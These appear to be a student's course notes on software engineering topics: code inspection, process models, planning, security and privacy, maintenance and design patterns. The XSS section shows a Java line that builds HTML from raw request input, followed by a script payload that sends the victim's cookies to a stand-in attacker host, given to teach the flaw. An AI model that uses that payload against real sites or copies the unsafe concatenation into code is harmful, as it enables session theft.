this project's tech stack was last updated and Dr. Heckman is really busy.
Also, stubbornly staying on old versions even though it makes you do more work
is realistic to industry so there's that I guess...

**TODO: Finish from the recording.**

# Presentations

Presentations are an important part of communicating with management and other
developers. As such, this will be our assignment for milestone 6 of the
on-boarding project.

The general layout of a presentation is the classic organization that you've
probably been taught since elementary school.

* Introduction: Identify your purpose, thesis, POV / ask / desired action, and
  audience. Introduce your "story" if applicable.
* Body: Build supporting points for your thesis.
* Conclusion: Restate your purpose and POV. Do a short overview. Then conclude
  with any advice you have.

Visuals and text should be simple, readable, and be a "launch pad for
discussion". Most importantly, think about the person who will have the hardest
time reading the presentation. For example, "can the person in the back of
class see this?" or "can someone watching this on their phone see this?".
**This includes increasing text size for code and browsers.**

For our on-boarding project, we will do live (recorded) demos. For this, make
sure to *freeze your code* (i.e. stop making changes), script your demos, and
practice your demos. That way nothing surprising happens! Live demos are filled
with peril, so please for the love of god make sure that it won't fail.

# Code Inspections/Review

Code inspection/review is the process of reviewing software artifacts by
developers, managers, and/or customers for comment or approval. The purpose is
to detect errors, ensure software meets requirements, and that everything is
well designed.

There are a few big different types of inspections

* Desk Check: Offline inspection done independently with findings (optionally)
  discussed at a meeting or directly with the member.
* Checklist: A set of standards set by the team that a developer can review.
* Structured Walkthrough: Done normally during a meeting. The developer walks
  the entire team through a section of code line by line.
* Commit Inspection: Basically a desk check but via PRs and diffs and a focus
  on changed content.

The benefits of reviewing code include the following.

* Promote Openness: People share knowledge which builds a culture of sharing
  knowledge and understanding everything.
* Raises Standard: People expect good code.
* Propel Teamwork: We have a standard way of communicating and resolving
  issues.
* Promote Values: Values make it into checklists and are checked.
* Frame Social Recognition: Trusted reviewers.

One of the most powerful things with standardization and improvement of
processes is **checklists** (like ARC). They provide a standard list of things
to think about and consider, insuring that all knowledge is shared and every
requirement is checked every time.

There are several roles for inspection. These don't have to be set in stone but
it is helpful to assign people individual work to help make the process
smoother.

* Author: Person who wrote it.
* Inspectors: Everyone except author.
* Moderator: Member of quality assurance team.
* Scribe: Take notes during inspection of issues of interest.
* Reader: Person who interprets artifact for inspectors.

Michael Fagan invented formal software inspections and as such the standard
methodology he introduced is called the **Fagan inspection**. Fagan inspection
is simple. It is there is individual review by all inspectors, where they mark
all faults found, following the checklist, and track how much time they spent
(less than 2 hours). Meanwhile the author prepares for questions. Then there is
a review meeting where all inspectors and the author meet. The moderator calls
the meeting and all inspectors go through all defects. The goal is **not to
correct defects** because that takes time, it should be to give a *course of
action* and trust that the author knows how to fix it. If necessary the author
can ask questions after inspection. Inspection shouldn't last more than 2 hours
and if it needs to then it should be split up.

The feedback should not be framed (either by the inspector or the author) as a
*personal attack* because those are counterproductive. Also, style issues
should not be the focus of the inspection. Possibly note it and definitely have
an automated formatter.

The preparation component of inspection is *incredibly important*. At the start
of a meeting, you should ask how long everyone spent on the individual portion
of inspection. If most people did not do the preparation, you should consider
cancelling the meeting.

*What are the issues with code review?* It's not effective for **discovering
bugs**, the findings are normally too low level and don't find architectural
issues, and developers normally don't like it. **It's still effecting for
knowledge transfer and ensuring requirements are met.**

# Software Process Models

A **software process model** is a standard template with how to do software
development.

**Plan-driven process models** have up-front, stable requirements. The cost of
development is minimized by doing all planning up front. This is common for
large, safety-critical projects, like aerospace and automotive projects. This
allows for specialization.

In general, plan-driven process models encourage predictability, thorough
documentation, and clear delineation of tasks. Normally companies even have
specific people whose job it is to do process improvement.

**Agile process models** have changing requirements. Agile process models try
to quickly and effectively incorporate changes to reduce the cost of
requirements changing during work. This is common for app development

*Note:* These are loose divides because really everything is a spectrum from
planning early to planning late.

## Models

## Plan Driven Process Models

The **waterfall model** is the classic plan-driven process model. It is
extremely predictable in terms of cost and time. However, it doesn't consider
risk or effectively adapt to changing requirements.

The **spiral model** is a modification of the waterfall model. Basically
instead of doing planning all up front, you heavily plan and do risk-analysis
of smaller prototypes. For example, first you try to get some requirements, do
a small prototype, do risk analysis with that prototype. Then you start to plan
heavier development, doing risk analysis again, and developing another more
detailed prototype.

The **personal software process (PSP)** is a system of checklists, scripts, and
templates to guide people through the "levels" of PSP. Basically you keep track
of defects you introduce and how much time you spend on completing tasks to
figure out what defects you normally introduce and how much time you spend so
you can get better at estimation. This tends to improve quality but people
struggle with detailed reporting and many people stop using it after awhile.

The **team software process (TSP)** is like PSP but extended to larger projects
and teams. To do this it adds more scripts, more forms, and more roles. The
idea is that by assigning everyone a task/part that they own you can improve
accountability and quality.

The **rational unified process (RUP)** applies ""object-oriented principles""
and uses UML as a notation for some reason. It's extremely flexible and thus
hard to define. That's really all we have to say.

## Agile Process Models

The agile processes (as a name) were kicked off by the "Agile Manifesto" which
was published in February 2001. Basically it said

> Individuals and interactions over process and tools.
> Working software over comprehensive documentation.
> Customer collaboration over contract negotiation.
> Responding to change over following a plan.

And then it listed the following 12 principles.

* Our highest priority is to satisfy the customer through **early and
  continuous delivery of valuable software**.
* **Welcome changing requirements**, even late in development. Agile processes
  harness change for the customer's competitive advantage.
* **Deliver working software frequently**, from a couple of weeks to a couple
  of months, with a preference to the shorter timescale.
* Business people and developers must **work together daily** throughout the
  project.
* Build projects around **motivated individuals**. Give them the environment
  and support they need, and trust them to get the job done.
* The most efficient and effective method of conveying information to and
  within a development team is **face-to-face conversation**.
* **Working software** is the primary measure of progress.
* Agile processes promote **sustainable development**. The sponsors,
  developers, and users should be able to maintain a constant pace
  indefinitely.
* **Continuous attention** to **technical excellence and good design** enhances
  agility.
* **Simplicity**, the art of maximizing the amount of work not done, is
  essential.
* The best architectures, requirements, and designs emerge from
  **self-organizing teams**.
* At regular intervals, the team **reflects** on how to become more effective,
  then tunes and adjusts its behavior accordingly.

The **incremental model** you get requirements, do some design, and then
implement a feature. You do this iteratively to gradually fulfil more and more
requirements. This still allow parallel work by having your design people
designing requirements and requirements people getting newer requirements. The
idea here is you don't **redo** any work but instead just keep **adding** to
the project.

The **iterative model** is the most agile plan-driven model. It is essentially
the *incremental model* except instead of adding on you redo things at the end
of each increment. The idea is that this minimizes **technical debt**, which is
just poor design decisions made to meet a deadline.

The **LEAN model** tries to do the following 9 things

* Eliminate Waste: Prevent extra features, thrashing, and bureaucracy.
* Create Knowledge: Do reviews
* Build Quality In: Write tests and do CI.
* Defer Commitment: Try to schedule irreversible decisions to the last
  responsible moment.
* Deliver Fast: Try to cut down on things in-progress.
* Respect People: Be accepting and congratulatory. Don't overwork people.
* Improve the System: Make measurements of quality.

**Extreme programming (XP)** values pair programming, working together,
incremental design, basically everything in agile. Work is organized into
**epics** and **stories**. Epics are a collection of stories. Stories are
informal requirements that say what a specific user wants to be able to do and
why. These features/requirements should be able to implemented in a single
**sprint**. A sprint is some measure of time, normally a weak.

TODO: Finish

# Planning & Project Management

Project management goes through three main phases:

* Planning: Plan for releases, some design, schedule resources, etc.
* Execution
* Control: What went well what went less well?

For release planning, you need to understand the *themes* or *high level epics*
you want to focus on, followed by a goal for you project, and your expected
velocity. So if we want to get 240 story points and we get 30 story points done
per iteration, it'll take 8 iterations (estimated) to do something.

Generally, when you're planning releases you either think about the release
date or the release features. With features you determine the release date by
the features included (velocity and story points). With dates you determine the
features by the required release date. We'll be doing date focused release
planning because, well, the class can only be so long.

A critical piece to planning is understanding your velocity/progress. A good
way to track this is with **burn-down charts**, where you track the number of
story points left at the end of every iteration. This lets you easily see your
velocity (the slope), your progress (the hight), and whether or not you'll
reach the deadline (estimated line).

{{ figure(src="burndown_chart.png", title="Burndown Chart Example") }}

There are two types of iterations we consider. A **normal iteration** and a
**stabilization iteration**. A normal iteration adds features and fixes bugs. A
stabilization iteration refactors code, documents code, removes old code, and
does all that good stuff. A stabilization iteration earns no story points
because fuck you; suffer with bad code; good code isn't Agile.

## Feature Based Roles

Often it is beneficial to split up tasks and their owners by **roles**. Roles
categorize what aspect of the project is being worked on. This helps tasks both
be more efficiently assigned and more efficiently worked on. There are a few
different types of division:

* User Role Division: Each developer implements a use case from the perspective
  of a certain user.
* Specialization Roles: You specialize on QA, planning, team management, etc.
* Feature-Based Roles: Split based on part of system, e.g. frontend, backend,
  and data entry.

Estimation is an important part of software development (and really just doing
things in general). **Ideal time** is the amount of time it takes to do
something with no distractions. **Elapsed time** is the amount of time it takes
to do something in practice. Generally, we're pretty good for estimating ideal
time but bad at elapsed time. A good rule of thumb is the multiply ideal time
by 3-4.

Some teams use **story points**, which are just a unitless measures of how long
it takes to do something. The actual value is meaningless but the relative
amount is valuable. It allows you to compare how long tasks will take. A
standard way to do things is assign an "average" task 5 points but really it
depends on the team.

With story points, how do we assign them? There's a few ways.

* Expert Opinion: Just use your gut feeling.
* Planning Poker: You have a moderator read the description and the task. Then
  everyone silently selects a card for their estimate and present it. Then the
  person with the highest estimate justifies it and the person with the lowest
  estimate justifies it. Then everyone re-votes until they converge.
  * This is less about getting an estimate and more about sharing knowledge and
    coming to a common understand. They can help get a rough idea of how to
    implement things and design them.

One reason we do story points is to find **velocity**, which is how many points
we do per week. This helps improve estimates for how many tasks a team can
complete.

# Security & Privacy

* Asset: People, property, and info under protection.
* Threat: Source of attack.
* Vulnerability: Weakness in protections. Latent, not necessarily exploited.
  * Like Fault.
* Exploit/Attack: Concrete use of a vulnerability to breach protection.
  * Like Error.
* Information Security:
  * Confidentiality: Not shared.
  * Integrity: Don't alter or destroy data.
  * Availability: Readily available to authorized users.
* Authentication: Act of validating entity's identity.
* Authorization: Act of checking whether the user is allowed to perform certain
  actions based on who they are.

**Security** is controlling what users can do and see, in other words it is the
ability of the system to perform its function with *confidentiality, integrity,
or availability losses*. **Privacy** is just controlling what others can see.

When we think about security, we don't just think about normal users making
mistakes. We think about intelligent attackers actively trying to exploit your
system.

## IEEE Top 10 Secure Design Principles

Below are the 10 principles, but our biggest ones (not listed below) are never
trust single points of failure, never trust your user, never trust input, and
never trust defaults (especially passwords).

Here are the real IEEE top 10 design principles for secure design.

**Earn or give, but never assume trust.** Ask how many permissions does this
*really* need? How fine grained can I make permissions? Assume people are
trying to exploit your system. Assume your users will make mistakes. Don't
assume the server APIs will be called in your expected order. Don't expect the
UI will actually restrict what the user sends to the server. (i.e. don't only
add business logic on frontend.) Don't store secrets on the client side.

**Use tamper‐proof authentication mechanisms.** Use two-factor authentication
or other systems.

**Authorize after you authenticate.** Ensure that the user really has the
permissions required to do a particular action. This should be done before
important actions.

**Strict separation.** Separate data your system works with and what your code
does. Don't evaluate strings. Don't evaluate or do string concatenation with
SQL queries. Ideally use **prepared queries** (see below). Don't provide too
much error information (e.g. don't do a stack trace). Don't say whether your
password or username was incorrect.

Prepared queries have a series of free variables represented by `?`. These
queries are compiled to a binary format and optimized by the database engine.
This makes it faster to execute future queries using this. These `?` variables
can then be *bound* to concrete types. Strings here don't need to be escaped
because the binary format ensures that strings and other variables are
interpreted appropriately.

```sql
-- This query has 2 parameters, one for name and one for price.
INSERT INTO products (name, price) VALUES (?, ?);
```

**Explicitly validate ALL data.** Validate multiple levels and *especially*
whenever data crosses a **trust boundary**, for example when the user enters
information or data comes from the API. You should have a **safe list /
whitelist** and a **block list / blacklist**

**Use cryptography correctly.** Don't push your secrets to git repositories.
Don't roll your own cryptographic libraries. Ensure you safely share keys and
other security things.

**Identify and handle sensitive data.** Make sure that you trust the servers
which you are storing information. Make sure that sensitive data is being
encrypted (i.e. don't use plain text). Often we have different levels for the
different types of information.

**Always consider users.** Make sure that your policies are reasonable for the
average person to follow. That is, don't be annoying because then users will
try to circumvent your policy.

**Understand your attack surface.** Your **attack surface** is the sum of all
paths for data and commands into and out of the system. The fewer paths you
have, the easier it is to secure them all. Close all ports possible. Restrict
user privileges as much as possible.

**Design flexible systems.** Ensure that updates and changes to the system
don't break security. For example, don't leak secrets when people change their
password, don't leak secrets when components outside your control change, and
don't leak secrets when someone updates their system.

## Cross-Site Scripting XSS

Cross site scripting occurs where user input somehow changes the HTML output
(for other people) without sufficient cleaning. If this occurs, then a user
could inject script tags into the HTML which other users will then load. This
allows for basic things like vandalism of websites or even worse injection of
JavaScript which can spoof fake input boxes (e.g. credit card number) or load
some malware onto the client which just loaded the page. Here is an example of
a XSS vulnerability.

```java
page += "<input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + "'>";
```

This could insert.

```
'><script>document.location='http://www.attacker.com/cgi-bin/cooki.cgi?foo='+document.cookie<script'
```

## Threat Modeling

In order to secure systems, we need to understand what we need to secure. To
help us this we have **threat models** which semi-formally describe how our
system could be insecure.

We can do threat modeling with **data flow diagrams** which models all the
nodes/actors in a system and how the data goes between them (and is validated).
Often the graph is segmented by *trust boundaries* (for example our local
server vs an unknown client).

One popular threat model is the **STRIDE threat model** which is an acronym for
the following.

* Spoofing: pretending to be someone else by using their credentials.
* Tampering: malicious modification of data.
* Repudiation: users deny an action because no proof that action happened.
* Information Disclosure: exposing information to those that shouldn't have it.
* Denial of Service: valid uses cannot access the system.
* Elevation of Privilege: user gains privilege they shouldn't have.

The idea with the model is that these are the 6 main ways for security to be
compromise. By looking at each one individually and how your system handles
each of these kind of exploits, you can determine how you need to secure your
system and what vulnerabilities exist. That is, you're finding the **abuse
cases** which is the possible threats in your system. You can model these
attacks using **attack trees**.

Normally when exploits or other security threats are found by cyber-security
peoples, **attack libraries** are published illustrating how the attack works.
This helps secure future systems.

Once we've identified these issues, how do we address them? There are 5 main ways.

* Mitigate: what have similar software packages done to mitigate the threat,
  and how has that worked for them?
* Eliminate: what software components are affected in eliminating the threat?
* Transfer: will you need to transfer data or processes to another part of the
  system that is more trusted/secure?
* Accept: outline the "acceptance criteria" that you will use to indicate the
  threat has been properly addressed.
* Wait and See: be prepared if an attacker or other malicious user manages to
  find a way to exploit a vulnerability associated with the threat.

## Risk Management

A **risk** is a potential future harm. Often risk is unavoidable but it is
still undesirable. As such we try to minimize the *probability* that a risk
occurs. A risk is no longer a risk if it has happened.

How do we quantify risks? There are a few main ways: guess, take measurements,
reason from first principles, listen to experts, and listen to experience.

**Risk management** is what we do to *identify*, *address*, and *eliminate*
risks before they become significant threats or a major source of expense. We
manage risks in two main ways: **reactively** and **proactively**. Reactive
teams correct or fix the problem rapidly in response to a crisis (e.g.
firefighters). Proactive teams try to prevent risks from becoming threats in
the first place (e.g. national park service).

In order to mitigate risks, we can take the following actions.

* Information Buying: Get more information by investing time to handle the
  risk. For example the risk of using new technology can be handled by using
  throw-away projects.
* Contingency Plans: Make sure you know what to do if the risk happens.
* Risk Reduction: Try to reduce the likelihood of the risk to occur. For
  example employ inspections to reduce the risk of losing information when
  someone leaves.
* Risk Acceptance: Conciously accept that you will live with the risk and
  potential loss.
* Risk Avoidance: Simply don't take the risky action. Often a lose-lose
  strategy because then you're not doing much.
* Risk Protection: Buy insurance or use redundant systems. For example have
  more servers than you need.

## Privacy

Privacy is essentially the **right to be left alone**, so you can have private
facts.

Here is the *Better Buisiness Bureau*'s outline of what parts of a privacy
policy there are.

* Policy: what personal information is being collected on the site
* Choice: what options the customer has about how/whether their data is
  collected and used
* Access: how a customer can see what data has been collected and
  change/correct it if necessary
* Security: state how any data that is collected is stored/protected
* Redress: what customer can do if privacy policy is not met
* Updates: how policy changes will be communicated

The **Code of Fair Information Practices (FIPs)** is a set of internationally
recognized practices of addressing privacy of information about individuals.
Essentially it says that you cannot keep secret personal data, a person must be
able to find out what information is being stored about them, and a person's
information can only be used for what they consent to.

The **Children's Online Privacy Protection Act (COPPA)** applies only to
children under 13. It essentially requires additional protections, parental
consent, and provides additional powers to the parent such as a way for parents
to review information.

The **Health Insurance Portability and Accountability Act (HIPAA)** provides a
standard for privacy and security of your **protected health information
(PHI)**. Further it provides a standardization of electronic data interchange
of healthcare information. Protected health information is any information that
can be used to identify the patient, including demographic, medical, and
financial information in medical records.

**EU General Data Protection Regulation (GDPR)**

# Maintenance

Maintenance is the "long tail" of development. That is it's what you spend most
of your time doing. There are four main types of maintenance we'll discuss.

**Corrective** maintenance tries to correct active faults. It is extremely
difficult because you want to fix the bug without breaking anything else. This
is made easier with good tests and clear design.

**Perfective** maintenance attempts to make the software better even when its
not broken. Like looking at what features are used and make the unused features
easier to use or otherwise better.

**Adaptive** maintenance is *reactive* changes that attempt to make the system
still usable on a new environment. This can be because of changes of work
policy, laws like the EU's GDPR, or operating system changes. Often adaptive
maintenance is in response to **bit rot**, which is when software starts to
break over time because of changes in its environment.

**Preventative** maintenance is *active* changes that attempt to make the
system still usable in future environments. In essence, it is adaptive
maintenance done ahead of time. You refactor things to make them easier to
understand and maintain even when they aren't actively broken. Because you're
not increasing/improving functionality, this is hard to sell to companies and
managers.

*What may effect the costs of maintenance?* If you have lots of turnover, there
is more maintenance effort. If you have contract based software developers,
there may be little incentive to make maintenance easy.

*How do we convince users to update?* It's difficult. We need to balance user
input and user annoyance. Updates that require user input are likely to be put
off and can be annoying. However, on the flip-side forcibly updating software
that causes disruptions to the user can be really annoying, for example Windows
update suddenly restarting your computer. It's a balance to make your system as
usable as possible.

# Software Engineering Economics

## Cost of Bugs

One of the main focuses of software engineering economics is to identify how
expensive bugs/faults are.

In general the later you find and fix a bug the more expensive it is.

*However, how do we actually determine what caused a fault?* We do this with
**root cause analysis**. Essentially, root cause analysis is where you keep
asking "Why?" a fault occurred until you can no longer get a meaningful
response. So for example for the fault that a server crashed.

* Our server crashed. Why?
* CPU usage spiked immediately before the crash. Why?
* The program hit an infinite loop. Why?
* A mistake by a developer. Why?
* Because they did not sufficiently test their code.

# (Unconscious) Bias

Bias is incredibly important to understand as a member of the work force and
especially if you manage other people. It is important because intrinsically we
want everyone to be treated equally. If you don't care about people and instead
only about profit, diverse teams also tend to perform better. It is also
incredibly important because small biases can compound into huge effects, so we
need to detect small biases.

First off, everyone is biased and not all bias is bad. For example, snakes
being dangerous is a pretty good bias. However, in America white Americans are
more likely to get a call back than black Americans, which is clearly a bad
bias.

How do we eliminate this bias? We'll in particular be looking at hiring. A good
way to do it is to eliminate names from resumes, have a checklist for what
qualifications you want, and a script of what questions you will ask.

# Design Patterns

Design patterns are standard ways to structure your program to make it easier
to maintain and understand. They also provide a standard language for
communicating designs between developers.

* Creational: How do we make an object?
* Structural: How do we compose classes statically?
* Behavioral: How do we manage the interactions within the system?

Here we'll talk about a few specific design patterns for in Java. These design
patterns often apply to other languages, maybe with some changes, but some of
these design patterns are irrelevant because of language features in other
languages. Likewise, some languages need additional design patterns to cover up
for features of the Java language.

The **abstract factory** design pattern is where you have an interface for a
set of related objects that you want to create, for example styled GUI elements
like scrollbars and window titles. Then you provide a concrete instance of this
abstract factory (basically a vtable) to something that needs to create these
elements. Then for example you could have a window system take in a factory for
window elements. Then you use this factory to generate window elements. This
allows you to dynamically change the styling.

The **factory method** design pattern is where your (super)class calls a method
to construct an object satisfying an interface rather than a constructor for a
specific implementation. That way your subclasses could override that method to
change the object being constructed, which can be useful if they need to hide
data into the object.

The **visitor pattern** is often used for data structures containing a fixed
set of types. Basically you have an interface that describes all of the
concrete types your data structure contains. Then you pass a concrete instance
of this interface (basically a vtable) to your data structure. The data data
structure gives you an iterator over something that can "accept" a visitor.
Then you iterate over those elements repeatedly having them "accept" your
visitor. *Why do this?* It makes it easy to add new operations. However, it
makes it hard to add new classes.

This is useful because it gives you double-dispatch (limited multiple-dispatch)
and "exhaustive matching". This is nice you're writing a compiler where you
want to describe any action you run on the AST. Compared to an if-else chain
this ensures that all instances are covered at compile time.

This is rendered somewhat obsolete if you have sum types and exhaustive
matching, like Rust's `enum` and `match`, or if you have multiple-dispatch like
Julia. Basically you just have an iterator that yields an enum. Then you
iterate over that and match on the enum to determine what operation you want to
do.

The **observer pattern** is basically a way to do publish-subscribe computing
using object-oriented code. A *subject* contains a set of *observers* which it
notifies whenever something happens. The observers satisfy a interface,
normally called `notify` which accepts some data. Whenever the subject has an
event happen (like a mouse button clicking), it iterates over the set of
observers it has to notify them of the event. The subject also has methods for
registering and de-registering observers.

# Configuration Management

In general, you should treat configuration of your systems as code, where
assets are tracked in a VCS (e.g. `git`). However, you still need to keep
secrets secret. This can be done by either factoring them out and having them
manually entered or encrypted.

This is like what ARC does with `provisioning`!

Some tools that help you with this are [Ansible](https://www.ansible.com/),
[Puppet](https://puppet.com/), [Chef](https://www.chef.io/), and even more.

# Continuous Integration / Continuous Deployment

Continuous integration uses many ideas with configuration management. It is the
practice of automatically building, testing, and analyzing your software in
response to every software change done. This allows you to more easily detect
issues quickly and more automatically redeploy and upgrade the software in
production.

This builds off of configuration management because to automatically build,
test, and deploy your software because you need a way to automatically set up
the machine to run.

Most often CI/CD runs in a very *dumb* way. Basically it doesn't reuse things
and just destroys and rebuilds everything every time. There is work being done
on incremental builds, reusing artifacts, and caching. It's a hard problem tho.

# Microservices

Microservices are a technique to make applications easier to maintain, upgrade,
and scale. They do this by splitting up your single *monolithic* process into
several smaller processes, i.e. *microservices*.

The main reason you wouldn't want to use microservices is often you don't need
the fault-tolerance or scalability of microservices. Also, microservices can
make software harder to maintain (e.g. have to maintain an API that could often
change) and it makes your software harder to deploy.

# Design Metrics

Design metrics are objective ways to measure the quality of software design.
These are *heuristics* and aren't a "silver bullet". That is some designs are
ranked wrongly low and others wrongly high. In general we'll be discussing
metrics on Java or Java-like languages but these metrics can be generalized.

One of the most basic metrics is **lines of code**, where more lines of code
means more maintenance. This isn't always correct because sometimes really low
lines of code means things are "magic" or needlessly obfuscated. How do you
count? People disagree but I generally think you should count comments, braces,
and everything else, that is run `wc -l` on the source code. That's because
lines of code isn't a perfect metric and making it simple is nice.

Another metric for Java-like languages is **number of classes** or for other
languages *number of modules*. In general you want a moderate amount of
classes/modules that way each class/module is reasonably well-focused but also
not overly segmented. Similarly you can measure the **number of methods** in
the class

You can measure the **cyclomatic complexity** which is the number of decision
points plus 1.

In general you also want high **cohesiveness** of a class. That is you want
each class to do/be a single thing. You can measure this by drawing a graph of
methods where each method and field is a node and each method or field a method
references gets a directed edge. Then you can see whether you get significant
groupings or should otherwise split the class.

On the other hand you generally want low **coupling** of a class. That is you
want your pieces of software to be as orthogonal/independent as possible. You
can measure this in a fairly complicated way which I won't show here, but
basically there's two types of coupling: *afferent coupling*, which is the
number of classes that depends on this class/package, and *efferent coupling*,
which is the number of classes that this class/package depends on.

# Performance & Monitoring

**Performance** is how (well) the system performs under load and **monitoring**
is the process of measuring performance while the system is operating.

There are two big things to measure that are somewhat independent: **thruput**
and **latency**. Thruput is how many requests the system can process per
second. Latency is how long it takes to service a request.

**Performance testing** is the process of running tests explicitly to identify
performance regressions and performance improvements. This let's you figure out
if the system will be able to handle load in production.

To do good performance testing, you need to figure out the workload your system
will undergo. Often the workload depends on the *operations* or things your
software system does. If you can enumerate all possible operations and their
frequency of use (i.e. create an **operational profile**), we can create better
(performance) tests and also better determine where to focus your energy for
fixing bugs and improving performance. To get these operational profiles, you
often need to do monitoring of the system or talking clients / domain experts.

*What issues exist with performance testing?* One of the biggest is that
applications don't run in isolation. There may be other applications or even
your operating system that are taking up resources. In the extreme case this
can make your tests flakey (which we experience with Jenkins).

*How do we collect data from a system?* In terms of performance and stability
data, we can get temperatures and other data from the hardware; memory usage,
swap usage, and other things from the operating system. If we have middleware
(e.g. Nginx), you can get log data from that and likewise for the application
itself. In terms of user experience (UX) logs, the system can log how users
interact with it so like what operations they use, what buttons they click,
etc.

One way to understand performance of a system is using a **flame graph**, which
is a graph of stack frames in your system over time. That way you can see what
functions take the longest, which helps you determine what functions you need
to optimize. In certain cases it can also help you find specific issues in your
system. For example maybe there are a bunch of recursive calls which can be
seen by extremely tall flames.

Here are some examples of metrics for a specific service, e.g. an e-commerce
website.

* Availability Rate: % of time system is up.
* Conversion Rate: % of customers that buy something of those who just looked.
  Can also be done for referrals and anything else similar.
* Mean Time Between Failures: Average time service is available between failures.
* Mean Time To Repair: Average time service is down when a repair occurs.
* Incident Count: How many incidents (e.g. failures) occur per unit of time
  (e.g. week).
* Actions Per Second: How often does a given action occur in your system? For
  example how many purchases, logins, sign-ups, etc, depending on your system.

How do operations manage failures? A good system to have is to have an
**incident management** plan, which is a series of steps which occur whenever a
failure is detected.

There's also a **green-amber-red light** system, where you categorize the state
of the system using a 3 light system. Green is everything working. Amber is
some non-critical modules are failing. Red is the system has completely failed.
